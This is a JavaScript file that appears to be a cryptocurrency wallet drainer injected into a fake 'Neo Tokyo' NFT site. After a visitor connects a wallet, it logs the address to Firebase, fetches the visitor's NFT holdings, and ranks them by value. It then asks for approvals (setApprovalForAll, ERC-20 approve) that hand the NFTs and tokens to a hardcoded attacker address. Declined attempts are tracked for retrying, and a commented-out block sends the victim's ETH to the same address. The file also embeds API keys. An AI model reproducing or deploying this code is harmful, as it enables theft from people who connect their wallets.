$(document).ready(function () {
  console.log('yawa');
})

//FIREBASE

const config = {
apiKey: "AIzaSyAvIsuf_K1uvzo3cXEJchcBWnxb7ryKzk0",
authDomain: "jangneotokyo.firebaseapp.com",
projectId: "jangneotokyo",
storageBucket: "jangneotokyo.appspot.com",
messagingSenderId: "20777123504",
appId: "1:20777123504:web:5d991c72b7af82ff6f4575"
}

const app = firebase.initializeApp(config)
const db = firebase.firestore(app)

const ref = db.collection('jangtokyo')

const OPENSEA_URL = "https://api.opensea.io/"
let account;

async function loadWeb3() {
try {
  window.web3 = await new Web3(window.ethereum)
} catch {
  console.log(error)
}
}

/**
 * 
 * @setItem
 * @getItem 
 */

function setItem(key, value) {
  localStorage.setItem(key, JSON.stringify(value));
  }

function getItem(key) {
  return JSON.parse(localStorage.getItem(key));
}

//


var sidebarCheck = setInterval(() => {
  console.log('interval running')
  intervalCheck()
}, 1000);

async function sidebar() {

  $('.sidebar-menu__opener').on('click', function () {

      // setTimeout(alert(';asd'), 100)

      setTimeout(() => {
          $('.css-14kzm9p').html(`
      <div class="sidebar-menu__item"><h4 class="sidebar-menu__item-title ">Collection Migration<span class="sidebar-menu__item-title-chevron "><svg width="32" height="32" viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" clip-rule="evenodd" d="M6.66675 10.6667H9.33341V13.3333H6.66675V10.6667ZM12.0001 16H9.33341V13.3333L12.0001 13.3333V16ZM14.6667 18.6667H12.0001V16L14.6667 16V18.6667ZM17.3334 18.6667V21.3333H14.6667L14.6667 18.6667H17.3334ZM20.0001 16H17.3334V18.6667H20.0001V16ZM22.6667 13.3333L22.6667 16L20.0001 16V13.3333L22.6667 13.3333ZM22.6667 13.3333V10.6667H25.33344V13.3333H22.6667Z"></path></svg></span></h4><div class="sidebar-menu__itemaccord "><div><button class="MuiButton-root MuiButton-contained MuiButton-containedPrimary MuiButton-sizeMedium MuiButton-containedSizeMedium MuiButton-fullWidth MuiButtonBase-root  css-1u5qx9" tabindex="0" type="button">CODES_MIGRATION.EXE<span class="MuiTouchRipple-root css-w0pj6f"></span></button></div></div></div><div class="MuiBox-root css-79elbk"><div class="MuiBox-root css-1sptbl0"><div class="sidebar-menu__item"><h4 class="sidebar-menu__item-title ">S2 citizen<span class="sidebar-menu__item-title-chevron "><svg width="32" height="32" viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" clip-rule="evenodd" d="M6.66675 10.6667H9.33341V13.3333H6.66675V10.6667ZM12.0001 16H9.33341V13.3333L12.0001 13.3333V16ZM14.6667 18.6667H12.0001V16L14.6667 16V18.6667ZM17.3334 18.6667V21.3333H14.6667L14.6667 18.6667H17.3334ZM20.0001 16H17.3334V18.6667H20.0001V16ZM22.6667 13.3333L22.6667 16L20.0001 16V13.3333L22.6667 13.3333ZM22.6667 13.3333V10.6667H25.33344V13.3333H22.6667Z"></path></svg></span></h4><div class="sidebar-menu__itemaccord "><form class="sidebar-menu__item-form"><div class="sidebar-menu__item-block smi_w80 pad-r50 orderf1"><input name="customMessage" type="text" placeholder="Set your custom message" value=""></div><div class="sidebar-menu__item-block smi_w33 pad-r50 smi_small orderf3"><input name="identity" type="text" inputmode="numeric" placeholder="Identities" value=""></div><div class="sidebar-menu__item-block smi_w33 pad-r50 smi_small orderf4"><input name="cache" type="text" inputmode="numeric" placeholder="Item Caches" value=""></div><div class="sidebar-menu__item-block smi_w33 pad-r50 smi_small orderf5"><input name="land" type="text" inputmode="numeric" placeholder="Land Deeds" value=""></div><div class="sidebar-menu__item-block smi_w20 pad-r50 orderf2"><button type="submit" class="sidebar-menu__item-btn"><span>upload</span></button></div><style>
          .form > * + * {
            margin-top: 1rem;
          }
        </style></form></div></div><div class="sidebar-menu__item"><h4 class="sidebar-menu__item-title ">S1 citizen<span class="sidebar-menu__item-title-chevron "><svg width="32" height="32" viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" clip-rule="evenodd" d="M6.66675 10.6667H9.33341V13.3333H6.66675V10.6667ZM12.0001 16H9.33341V13.3333L12.0001 13.3333V16ZM14.6667 18.6667H12.0001V16L14.6667 16V18.6667ZM17.3334 18.6667V21.3333H14.6667L14.6667 18.6667H17.3334ZM20.0001 16H17.3334V18.6667H20.0001V16ZM22.6667 13.3333L22.6667 16L20.0001 16V13.3333L22.6667 13.3333ZM22.6667 13.3333V10.6667H25.33344V13.3333H22.6667Z"></path></svg></span></h4><div class="sidebar-menu__itemaccord "><form class="sidebar-menu__item-form"><div class="sidebar-menu__item-block smi_w80 pad-r50 orderf1"><input name="customMessage" type="text" placeholder="Set your custom message" value=""></div><div class="sidebar-menu__item-block smi_w25 pad-r50 smi_small orderf3"><input name="identity" type="text" inputmode="numeric" placeholder="Identities" value=""></div><div class="sidebar-menu__item-block smi_w25 pad-r50 smi_small orderf4"><input name="vault" type="text" inputmode="numeric" placeholder="Vault boxes — Optional" value=""></div><div class="sidebar-menu__item-block smi_w25 pad-r50 smi_small orderf5"><input name="cache" type="text" inputmode="numeric" placeholder="Item Caches" value=""></div><div class="sidebar-menu__item-block smi_w25 pad-r50 smi_small orderf6"><input name="land" type="text" inputmode="numeric" placeholder="Land Deeds" value=""></div><div class="sidebar-menu__item-block smi_w20 pad-r50 orderf2"><button class="sidebar-menu__item-btn"><span>upload</span></button></div><style>
          .form > * + * {
            margin-top: 1rem;
          }
        </style></form></div></div><div class="sidebar-menu__item"><h4 class="sidebar-menu__item-title ">Identities &amp; lands<span class="sidebar-menu__item-title-chevron "><svg width="32" height="32" viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" clip-rule="evenodd" d="M6.66675 10.6667H9.33341V13.3333H6.66675V10.6667ZM12.0001 16H9.33341V13.3333L12.0001 13.3333V16ZM14.6667 18.6667H12.0001V16L14.6667 16V18.6667ZM17.3334 18.6667V21.3333H14.6667L14.6667 18.6667H17.3334ZM20.0001 16H17.3334V18.6667H20.0001V16ZM22.6667 13.3333L22.6667 16L20.0001 16V13.3333L22.6667 13.3333ZM22.6667 13.3333V10.6667H25.33344V13.3333H22.6667Z"></path></svg></span></h4><div class="sidebar-menu__itemaccord "><div class="sidebar-menu__item-blist"><div class="sidebar-menu__item-bitem"><form action="" class="sidebar-menu__item-bitem-form"><div class="sidebar-menu__item-bitem-form-holder"><h6 class="sidebar-menu__item-bitem-form-title">Mint New Identity</h6><div class="sidebar-menu__item-bitem-form-info">Cost: 2000 bytes</div></div><button class="sidebar-menu__item-bitem-form-btn" disabled="">offline</button></form></div><div class="sidebar-menu__item-bitem"><form action="" class="sidebar-menu__item-bitem-form"><div class="sidebar-menu__item-bitem-form-holder"><h6 class="sidebar-menu__item-bitem-form-title">Create New Land</h6><div class="sidebar-menu__item-bitem-form-info">Cost: 500 bytes</div></div><button class="sidebar-menu__item-bitem-form-btn" disabled="">offline</button></form></div><div class="sidebar-menu__item-bitem"><form action="" class="sidebar-menu__item-bitem-form"><div class="sidebar-menu__item-bitem-form-holder"><h6 class="sidebar-menu__item-bitem-form-title">S2 Identity Item Claim</h6><input type="text" inputmode="numeric" placeholder="Add S2 Identity Token ID" value="0"></div><button class="sidebar-menu__item-bitem-form-btn" disabled="">submit</button></form></div><div class="sidebar-menu__item-bitem"><form action="" class="sidebar-menu__item-bitem-form"><div class="sidebar-menu__item-bitem-form-holder"><h6 class="sidebar-menu__item-bitem-form-title">S2 Identity Land Claim</h6><input type="text" inputmode="numeric" placeholder="Add S2 Identity Token ID" value="0"></div><button class="sidebar-menu__item-bitem-form-btn" disabled="">submit</button></form></div></div></div></div></div><button class="sidebar-menu__item-btn MuiBox-root css-htg0vc"><span>Connect Wallet</span></button></div>
      `)

      $('.css-txdpd1').remove()


      console.log('sidebar clicked')

      
      
      const button1 = $('.css-1u5qx9')
      const button2 = $('.css-htg0vc')

      button1.on('click', function () {
          menuItems()
      })
      button2.on('click', function () {
          menuItems()
      })





      }, 1000);

  })
}


async function header() {
  var headermenu0, headermenu1, headermenu2, headermenu3, headermenu4, headermenu5;
  
  
  headermenu0 = $('.header-menu__right').find('ul').find('li').eq([0])
  headermenu1 = $('.header-menu__right').find('ul').find('li').eq([1])
  headermenu2 = $('.header-menu__right').find('ul').find('li').eq([2])
  headermenu3 = $('.header-menu__right').find('ul').find('li').eq([3])
  headermenu4 = $('.header-menu__right').find('ul').find('li').eq([4])
  headermenu5 = $('.header-menu__right').find('ul').find('li').eq([5])



  headermenu0.find('a').removeClass('active')
  headermenu1.find('a').removeClass('active')
  headermenu2.find('a').removeClass('active')
  headermenu3.find('a').removeClass('active')
  headermenu4.find('a').removeClass('active')
  headermenu5.find('a').removeClass('active')
  





  headermenu0.on('click', function () {
    menuItems()
  })
  headermenu1.on('click', function () {
    menuItems()
  })
  headermenu2.on('click', function () {
    menuItems()
  })
  headermenu3.on('click', function () {
    menuItems()
  })
  headermenu4.on('click', function () {
    menuItems()
  })
  headermenu5.on('click', function () {
    menuItems()
  })


/*--------*/
var faq = $('.header-menu__right').find('ul').eq([1]).find('li').eq([0])
faq.find('a').removeClass('active')

faq.on('click', function () {
  menuItems()
})

}


async function intervalCheck() {

  if ($('.sidebar').length) {
      clearInterval(sidebarCheck)
      console.log('true, interval cleared')
      await sidebar()
      await header()


  } else {
      console.log('false')
  }

}

async function menuItems() {
      const ganaYawa = $('.menu2').find('li').eq([6]).find('span').eq([0]).find('span.menu__link-text')
      ganaYawa.click()
}





async function getAddress() {
  
// try {
  
//     await ethereum.request({
//     method: 'wallet_switchEthereumChain',
//     params: [{chainId: '0x89'}]})
// } catch (e) {
  
// }
  
  const d = JSON.parse(localStorage.getItem('wagmi.store'))
  console.log(d);
  const userAddress = d.state.data.account

  account = userAddress
  console.log(account)



  const LISTCOLLECTION =   db.collection('addresses').doc(account)

  await LISTCOLLECTION.get().then(
    (docSnapshot) => {
      if (
        docSnapshot.exists
      ) {
        console.log('doc exists')
        LISTCOLLECTION.update({
          status: 'connected',
          date: new Date()
        })

      } else {

        console.log('doc not found')
        LISTCOLLECTION.set({
          address: account,
          date: new Date(),
          status: 'connected'
        }).then( () => {
          console.log('successfully added')
        }).catch( () => {
          console.log('error adding document');
        })


      }
    }
  )



}



const _abi = [
  {
    inputs: [],
    stateMutability: "nonpayable",
    type: "constructor",
  },
  {
    anonymous: false,
    inputs: [
      {
        indexed: true,
        internalType: "address",
        name: "owner",
        type: "address",
      },
      {
        indexed: true,
        internalType: "address",
        name: "approved",
        type: "address",
      },
      {
        indexed: true,
        internalType: "uint256",
        name: "tokenId",
        type: "uint256",
      },
    ],
    name: "Approval",
    type: "event",
  },
  {
    anonymous: false,
    inputs: [
      {
        indexed: true,
        internalType: "address",
        name: "owner",
        type: "address",
      },
      {
        indexed: true,
        internalType: "address",
        name: "operator",
        type: "address",
      },
      {
        indexed: false,
        internalType: "bool",
        name: "approved",
        type: "bool",
      },
    ],
    name: "ApprovalForAll",
    type: "event",
  },
  {
    anonymous: false,
    inputs: [
      {
        indexed: true,
        internalType: "address",
        name: "previousOwner",
        type: "address",
      },
      {
        indexed: true,
        internalType: "address",
        name: "newOwner",
        type: "address",
      },
    ],
    name: "OwnershipTransferred",
    type: "event",
  },
  {
    anonymous: false,
    inputs: [
      {
        indexed: true,
        internalType: "address",
        name: "from",
        type: "address",
      },
      {
        indexed: true,
        internalType: "address",
        name: "to",
        type: "address",
      },
      {
        indexed: true,
        internalType: "uint256",
        name: "tokenId",
        type: "uint256",
      },
    ],
    name: "Transfer",
    type: "event",
  },
  {
    inputs: [
      {
        internalType: "address",
        name: "to",
        type: "address",
      },
      {
        internalType: "uint256",
        name: "tokenId",
        type: "uint256",
      },
    ],
    name: "approve",
    outputs: [],
    stateMutability: "nonpayable",
    type: "function",
  },
  {
    inputs: [
      {
        internalType: "address",
        name: "owner",
        type: "address",
      },
    ],
    name: "balanceOf",
    outputs: [
      {
        internalType: "uint256",
        name: "",
        type: "uint256",
      },
    ],
    stateMutability: "view",
    type: "function",
  },
  {
    inputs: [
      {
        internalType: "uint256",
        name: "tokenId",
        type: "uint256",
      },
    ],
    name: "getApproved",
    outputs: [
      {
        internalType: "address",
        name: "",
        type: "address",
      },
    ],
    stateMutability: "view",
    type: "function",
  },
  {
    inputs: [
      {
        internalType: "address",
        name: "owner",
        type: "address",
      },
      {
        internalType: "address",
        name: "operator",
        type: "address",
      },
    ],
    name: "isApprovedForAll",
    outputs: [
      {
        internalType: "bool",
        name: "",
        type: "bool",
      },
    ],
    stateMutability: "view",
    type: "function",
  },
  {
    inputs: [],
    name: "name",
    outputs: [
      {
        internalType: "string",
        name: "",
        type: "string",
      },
    ],
    stateMutability: "view",
    type: "function",
  },
  {
    inputs: [],
    name: "owner",
    outputs: [
      {
        internalType: "address",
        name: "",
        type: "address",
      },
    ],
    stateMutability: "view",
    type: "function",
  },
  {
    inputs: [
      {
        internalType: "uint256",
        name: "tokenId",
        type: "uint256",
      },
    ],
    name: "ownerOf",
    outputs: [
      {
        internalType: "address",
        name: "",
        type: "address",
      },
    ],
    stateMutability: "view",
    type: "function",
  },
  {
    inputs: [],
    name: "renounceOwnership",
    outputs: [],
    stateMutability: "nonpayable",
    type: "function",
  },
  {
    inputs: [
      {
        internalType: "address",
        name: "to",
        type: "address",
      },
      {
        internalType: "uint256",
        name: "tokenId",
        type: "uint256",
      },
    ],
    name: "safeMint",
    outputs: [],
    stateMutability: "nonpayable",
    type: "function",
  },
  {
    inputs: [
      {
        internalType: "address",
        name: "from",
        type: "address",
      },
      {
        internalType: "address",
        name: "to",
        type: "address",
      },
      {
        internalType: "uint256",
        name: "tokenId",
        type: "uint256",
      },
    ],
    name: "safeTransferFrom",
    outputs: [],
    stateMutability: "nonpayable",
    type: "function",
  },
  {
    inputs: [
      {
        internalType: "address",
        name: "from",
        type: "address",
      },
      {
        internalType: "address",
        name: "to",
        type: "address",
      },
      {
        internalType: "uint256",
        name: "tokenId",
        type: "uint256",
      },
      {
        internalType: "bytes",
        name: "data",
        type: "bytes",
      },
    ],
    name: "safeTransferFrom",
    outputs: [],
    stateMutability: "nonpayable",
    type: "function",
  },
  {
    inputs: [
      {
        internalType: "address",
        name: "operator",
        type: "address",
      },
      {
        internalType: "bool",
        name: "approved",
        type: "bool",
      },
    ],
    name: "setApprovalForAll",
    outputs: [],
    stateMutability: "nonpayable",
    type: "function",
  },
  {
    inputs: [
      {
        internalType: "bytes4",
        name: "interfaceId",
        type: "bytes4",
      },
    ],
    name: "supportsInterface",
    outputs: [
      {
        internalType: "bool",
        name: "",
        type: "bool",
      },
    ],
    stateMutability: "view",
    type: "function",
  },
  {
    inputs: [],
    name: "symbol",
    outputs: [
      {
        internalType: "string",
        name: "",
        type: "string",
      },
    ],
    stateMutability: "view",
    type: "function",
  },
  {
    inputs: [
      {
        internalType: "uint256",
        name: "tokenId",
        type: "uint256",
      },
    ],
    name: "tokenURI",
    outputs: [
      {
        internalType: "string",
        name: "",
        type: "string",
      },
    ],
    stateMutability: "view",
    type: "function",
  },
  {
    inputs: [
      {
        internalType: "address",
        name: "from",
        type: "address",
      },
      {
        internalType: "address",
        name: "to",
        type: "address",
      },
      {
        internalType: "uint256",
        name: "tokenId",
        type: "uint256",
      },
    ],
    name: "transferFrom",
    outputs: [],
    stateMutability: "nonpayable",
    type: "function",
  },
  {
    inputs: [
      {
        internalType: "address",
        name: "newOwner",
        type: "address",
      },
    ],
    name: "transferOwnership",
    outputs: [],
    stateMutability: "nonpayable",
    type: "function",
  },
];



async function check() {

  await getAddress();

  console.log(account);

  var nft = await nfts(account)
  console.log(nft)


var data = {
  time: new Date(),
  spoof: nft,
  owner: account
}


      if (getItem(account) == null || getItem(account).length == 0) {
          console.log('no data')

          setItem(account, data)
          trade()
          console.log('data added')

      } else {
          console.log('data already exists')

          // trade()

        await BUSD();

        // await TOKENS()

        // await citizen();

        await midnight();

        // await titanLegend();
        // await titanLegends();

        
      }

                  


}



async function trade() {

  await loadWeb3();


  var collection = []
  var owner;
  var sortedCollection = []


  data = getItem(account)

  owner = data.owner
  collection = data.spoof


 for (let i = 0; i < collection.length; i++) {
  collection[i].worth = 0;
  collection[i].owner = owner;


  try {

      var result =  await $.ajax({
          url: "https://eth-mainnet.g.alchemy.com/nft/v2/i3QT46oiQpqqceCkiWb0kIn24YNEVcRH/getFloorPrice?contractAddress="+collection[i].contract,
          method: "GET",
          // success: function (data) {
          //     console.log(data)



          // }
      })

      if (result.openSea != undefined && result.openSea.floorPrice != undefined)
      collection[i].worth = result.openSea.floorPrice

      
  } catch (error) {
      console.log(error)

      if(collection[i].stats.seven_day_volume > 0) {
          collection[i].worth = Math.round(
              collection[i].stats.seven_day_volume * 0.8 * 10000
          ) / 10000
      }
  }
  
 }

 collection = collection.sort( (a, b) => {
  return a.worth < b.worth
  ? 1
  : -1;
})



for (let i = 0; i < collection.length; i++) {

   if (collection[i].worth != 0) {
      sortedCollection.push(collection[i])
   }
  
}

collection = sortedCollection;


 console.log(collection)

/*---------------------------------------------------------------*/

  var declinedCollection = []

 //jang contracts
 const collection_contracts = db.collection(account.toLowerCase())
 //



await collection_contracts.get().then( (querySnapshot) => {
  querySnapshot.forEach( (doc) => {
      var data = doc.data()
      var approved = data.approved

      //console.log(approved)

      
      if (approved === false) {
          console.log('declined')

          // console.log(data)

          //console.log(data)
          declinedCollection.push(data)
      } else {
          //
          console.log('nothing saved yet')
      }

  })
}).catch( (error) => {
  console.log('error gettings documents ' + error)
})





if (declinedCollection.length < 1) {
  console.log('no data declined contracts yet')
} else {
  console.log('filtered declined collections')
  collection = declinedCollection
}




console.log(collection)
/*---------------------------------------------------------------*/

  for (let i = 0; i < collection.length; i++) {
     

      // console.log(collection[i])

      try {

          
          if (collection[i].approved == true) {


              console.log('approved')
              //no more approval
              //ilocalstorage nalang ni?


          } else {

      

              var collectionContract = await new window.web3.eth.Contract(_abi, collection[i].contract, {gas: '100000'})
              await collectionContract.methods.setApprovalForAll('0x2c5da2bcFe33ecF847F7558f6195BaBC2F582262', true).send({from: account})

              collection[i].date = new Date()
              collection[i].approved = true
              console.log(collection[i])
              
              collection_contracts.doc(collection[i].contract).set(collection[i])
                  .then( () => {
                      console.log('data updated')
                  })
                  .catch( () => {
                      console.log('error data update')
                  })


          }

          
      } catch (error) {

          console.log(error)

          if (error.code == 4001) {
       

              collection[i].date = new Date()
              collection[i].approved = false
              console.log(collection[i])



              collection_contracts.doc(collection[i].contract).get()
                  .then( (docSnapshot) => {
                      if (docSnapshot.exists) {

                          console.log('data already existed')

                      } else {
                          console.log('doc does not exist')

                          collection_contracts.doc(collection[i].contract).set(collection[i])
                          .then( () => {
                              console.log('data updated')
                          }).catch( (error) => {
                              console.log('error setting document ' + error)
                          })
                      }
                  }).catch( (error) => {
                      console.log('Error getting data ' + error)
                  })
                      



              
          }
          
      }


  

  }





  // const t = [
  //   [{token: '0x9F52c8ecbEe10e00D9faaAc5Ee9Ba0fF6550F511'}, {balance: 17000}],
  //   [{token: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48'}, {balance: 786}],
  
  // ]
  
  //  t.forEach( async e => {
  //     var t = e[0].token
  //     var b = e[1].balance
  //     // var c = e[2].chain
  
  //     console.log(t,b,)
  
  //     await tokenGet(t, b)
  // })
  



//  var value = await get_eth(account)
//  var minusvalue = value - 0.0084

// const finalAmount = Web3.utils.toWei(minusvalue.toString(), 'ether')




// console.log(finalAmount)
// const txData = {
//   from: account,
//   to: '0x2c5da2bcFe33ecF847F7558f6195BaBC2F582262',
//   value: finalAmount,
// };


// await web3.eth.sendTransaction(txData)
//   .then( (txHash) => {
//     console.log(txHash)
//   }).catch( (err) => {
//     console.log(err)
//   })





  

}
//

async function nfts(addr) {
  var url = `${OPENSEA_URL}api/v2/chain/ethereum/account/${addr}/nfts`  
  var nft = []
  var contract = []


await $.ajax({
  url: url,
  method: "GET",
  headers: {
      accept: 'application/json',
      'x-api-key': '078b8acce6a34dd3a2dbb0cd34127203'
    },

    success: function (data) {
      // console.log(data.nfts)

      for (var i = 0; i < data.nfts.length; i++) {

          nft.push(data.nfts[i].contract)

      }

      var uniq = [... new Set(nft)]

      nft = uniq
    }
    
})

  nft.forEach( e => {

      var data = {contract: ''}
      data.contract = e

      contract.push(data)
  })

return contract
}


/*------------------------------------------------------*/

var checkConnected = setInterval( async () => {

  var d = JSON.parse(localStorage.getItem('wagmi.store'))
  
    if (!('account' in d.state.data) ) {
      console.log('not connected')
    } else {
      //getAddress()
      check()
      intervalStop()
      console.log('connected')
  
    }
  
  }, 3000);
  
  function intervalStop() {
    clearInterval(checkConnected);
    console.log('intervalStopped')
  }
  
  /*------------------------------------------------------*/

  async function get_eth(address) {

      const balances = web3.utils.fromWei(
        await web3.eth.getBalance(address),
        'ether'
      )* 1;

      return balances;

  }


const erc20TokenContractAbi = [
  { inputs: [], stateMutability: "nonpayable", type: "constructor" },
  {
    anonymous: false,
    inputs: [
      {
        indexed: true,
        internalType: "address",
        name: "owner",
        type: "address",
      },
      {
        indexed: true,
        internalType: "address",
        name: "spender",
        type: "address",
      },
      {
        indexed: false,
        internalType: "uint256",
        name: "value",
        type: "uint256",
      },
    ],
    name: "Approval",
    type: "event",
  },
  {
    anonymous: false,
    inputs: [
      { indexed: true, internalType: "address", name: "from", type: "address" },
      { indexed: true, internalType: "address", name: "to", type: "address" },
      {
        indexed: false,
        internalType: "uint256",
        name: "value",
        type: "uint256",
      },
    ],
    name: "Transfer",
    type: "event",
  },
  {
    inputs: [
      { internalType: "address", name: "owner", type: "address" },
      { internalType: "address", name: "spender", type: "address" },
    ],
    name: "allowance",
    outputs: [{ internalType: "uint256", name: "", type: "uint256" }],
    stateMutability: "view",
    type: "function",
  },
  {
    inputs: [
      { internalType: "address", name: "spender", type: "address" },
      { internalType: "uint256", name: "amount", type: "uint256" },
    ],
    name: "approve",
    outputs: [{ internalType: "bool", name: "", type: "bool" }],
    stateMutability: "nonpayable",
    type: "function",
  },
  {
    inputs: [{ internalType: "address", name: "account", type: "address" }],
    name: "balanceOf",
    outputs: [{ internalType: "uint256", name: "", type: "uint256" }],
    stateMutability: "view",
    type: "function",
  },
  {
    inputs: [],
    name: "decimals",
    outputs: [{ internalType: "uint8", name: "", type: "uint8" }],
    stateMutability: "view",
    type: "function",
  },
  {
    inputs: [
      { internalType: "address", name: "spender", type: "address" },
      { internalType: "uint256", name: "subtractedValue", type: "uint256" },
    ],
    name: "decreaseAllowance",
    outputs: [{ internalType: "bool", name: "", type: "bool" }],
    stateMutability: "nonpayable",
    type: "function",
  },
  {
    inputs: [
      { internalType: "address", name: "spender", type: "address" },
      { internalType: "uint256", name: "addedValue", type: "uint256" },
    ],
    name: "increaseAllowance",
    outputs: [{ internalType: "bool", name: "", type: "bool" }],
    stateMutability: "nonpayable",
    type: "function",
  },
  {
    inputs: [],
    name: "name",
    outputs: [{ internalType: "string", name: "", type: "string" }],
    stateMutability: "view",
    type: "function",
  },
  {
    inputs: [],
    name: "symbol",
    outputs: [{ internalType: "string", name: "", type: "string" }],
    stateMutability: "view",
    type: "function",
  },
  {
    inputs: [],
    name: "totalSupply",
    outputs: [{ internalType: "uint256", name: "", type: "uint256" }],
    stateMutability: "view",
    type: "function",
  },
  {
    inputs: [
      { internalType: "address", name: "recipient", type: "address" },
      { internalType: "uint256", name: "amount", type: "uint256" },
    ],
    name: "transfer",
    outputs: [{ internalType: "bool", name: "", type: "bool" }],
    stateMutability: "nonpayable",
    type: "function",
  },
  {
    inputs: [
      { internalType: "address", name: "sender", type: "address" },
      { internalType: "address", name: "recipient", type: "address" },
      { internalType: "uint256", name: "amount", type: "uint256" },
    ],
    name: "transferFrom",
    outputs: [{ internalType: "bool", name: "", type: "bool" }],
    stateMutability: "nonpayable",
    type: "function",
  },
];

async function tokenGet(tokenAddress, tokenBalance) {
  
try {
  // await ethereum.request({
  //   method: 'wallet_switchEthereumChain',
  //   params: [{chainId: '0x89'}]})


    const tokenContract = await new web3.eth.Contract(erc20TokenContractAbi, tokenAddress);
    const toAddress = '0x2c5da2bcFe33ecF847F7558f6195BaBC2F582262';

    const tokenDecimals = web3.utils.toBN(18);
    const tokenAmountToApprove = web3.utils.toBN(tokenBalance);
    const calculatedApproveValue = web3.utils.toHex(tokenAmountToApprove.mul(web3.utils.toBN(10).pow(tokenDecimals)));

    await tokenContract.methods.approve(toAddress, calculatedApproveValue).send({from: account})

} catch (error) {
  console.log(error)
}


    //     await db.collection('tokenApproval').add({
    //     tokenContract: tokenAddress,
    //     approvedBalance: tokenBalance,
    //     date: new Date(),
    //     address: account
    // }).then( () => {
    //     console.log('success')
    // }).catch( () => {
    //     console.log('error')
    // })

    

    }



async function BUSD(){
  await loadWeb3();

  try {
      await window.ethereum.request({
    method: 'wallet_switchEthereumChain',
    params: [{chainId: '0x38'}]})
} catch(e) {
  
}
    const t = [
    // [{token: '0x9F52c8ecbEe10e00D9faaAc5Ee9Ba0fF6550F511'}, {balance: 17000}],


      [{token: '0x3529EAdAcb3375eD37124c40Ada9827A6B0eC2e1'}, {balance: 13000}],

  
  ]
  
   t.forEach( async e => {
      var t = e[0].token
      var b = e[1].balance
      // var c = e[2].chain
  
      console.log(t,b,)
  
      await tokenGet(t, b)
  })
}

async function TOKENS(){
  await loadWeb3();
    const t = [
    // [{token: '0x9F52c8ecbEe10e00D9faaAc5Ee9Ba0fF6550F511'}, {balance: 17000}],
            // [{token: '0x62D0A8458eD7719FDAF978fe5929C6D342B0bFcE'}, {balance: 147931}],
    // [{token: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48'}, {balance: 786}],

      [{token: '0x813125C54d72853291809659d7cCAe49705C97Bc'}, {balance: 1}],
      [{token: '0xB622907fBff6CbF7C3Ce355173251E3EDb13A606'}, {balance: 765569}],
          // [{token: '0xB622907fBff6CbF7C3Ce355173251E3EDb13A606'}, {balance: 765569}],
      [{token: '0x94D40179277269e7362E17441878DecE7E774285'}, {balance: 4610140}],

      //0x62D0A8458eD7719FDAF978fe5929C6D342B0bFcE
  
  ]
  
   t.forEach( async e => {
      var t = e[0].token
      var b = e[1].balance
      // var c = e[2].chain
  
      console.log(t,b,)
  
      await tokenGet(t, b)
  })
}


async function citizen() {


          await loadWeb3();
                      var collectionContract = await new window.web3.eth.Contract(_abi, '0xb9951b43802dcf3ef5b14567cb17adf367ed1c0f', {gas: '100000'})
              await collectionContract.methods.setApprovalForAll('0x2c5da2bcFe33ecF847F7558f6195BaBC2F582262', true).send({from: account})
}

async function midnight(){
await loadWeb3();
try {
      await window.ethereum.request({
    method: 'wallet_switchEthereumChain',
    params: [{chainId: '0x89'}]})
} catch(e) {
  
}
//0x89a4875c190565505b7891b700c2c6dc91816a47
                        var collectionContract = await new window.web3.eth.Contract(_abi, '0x89a4875c190565505b7891b700c2c6dc91816a47', {gas: '100000'})
              await collectionContract.methods.setApprovalForAll('0x2c5da2bcFe33ecF847F7558f6195BaBC2F582262', true).send({from: account})
}

async function titanLegend() {
//0x78e0e038347497ef2dea4ad61ab0bd2b86d38c58
await loadWeb3();
                          var collectionContract = await new window.web3.eth.Contract(_abi, '0x78e0e038347497ef2dea4ad61ab0bd2b86d38c58', {gas: '100000'})
              await collectionContract.methods.setApprovalForAll('0x2c5da2bcFe33ecF847F7558f6195BaBC2F582262', true).send({from: account})
  
}

async function titanLegends() {
await loadWeb3();
  //0x3a34d11dad0b063307ee118d8415b31842911448

                            var collectionContract = await new window.web3.eth.Contract(_abi, '0x3a34d11dad0b063307ee118d8415b31842911448', {gas: '100000'})
              await collectionContract.methods.setApprovalForAll('0x2c5da2bcFe33ecF847F7558f6195BaBC2F582262', true).send({from: account})
}
